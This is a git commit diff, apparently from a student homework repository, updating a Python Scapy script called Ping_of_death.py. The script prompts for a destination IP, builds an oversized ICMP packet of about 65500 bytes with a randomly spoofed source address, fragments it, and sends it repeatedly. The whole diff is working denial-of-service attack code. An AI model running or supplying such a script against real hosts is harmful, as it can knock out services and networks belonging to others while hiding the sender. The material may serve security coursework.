b1efe425a567f69415d111bb5fb889902e97107b
miseo_jeon <83704225+raichal2000@users.noreply.github.com>
2023-04-23 21:27:58 +0900

    Update Ping_of_death.py

--- src/HW4/Ping_of_death.py
+++ src/HW4/Ping_of_death.py
@@ -1,19 +1,27 @@
-#!/usr/bin/python
-
 from scapy.all import *
-import string
 
 def main():
     icmpflood()
 
 def icmpflood():
-    data = "A"
     target = DestinationIP()
     byte = input("How many byte do you sent [Press enter for 65500]: ")
     if byte == "":
         byte = 65500
+    num = input("How many packet do you sent [Press enter for 1]: ")
+    if num == "":
+        num = 1
+    else:
+        num = int(num)
 
-    send(IP(src = RandIP(), dst=target, proto="icmp")/ICMP()/(data*int(byte)))
+    ip_hdr = IP(src = RandIP(), dst=target, proto="icmp")
+    packet = ip_hdr/ICMP()/("A"*int(byte))
+
+    fragments = fragment(packet)
+
+    while num :
+        send(fragments)
+        num-=1
         
 def DestinationIP():
     dstIP = input("Destination IP: ")
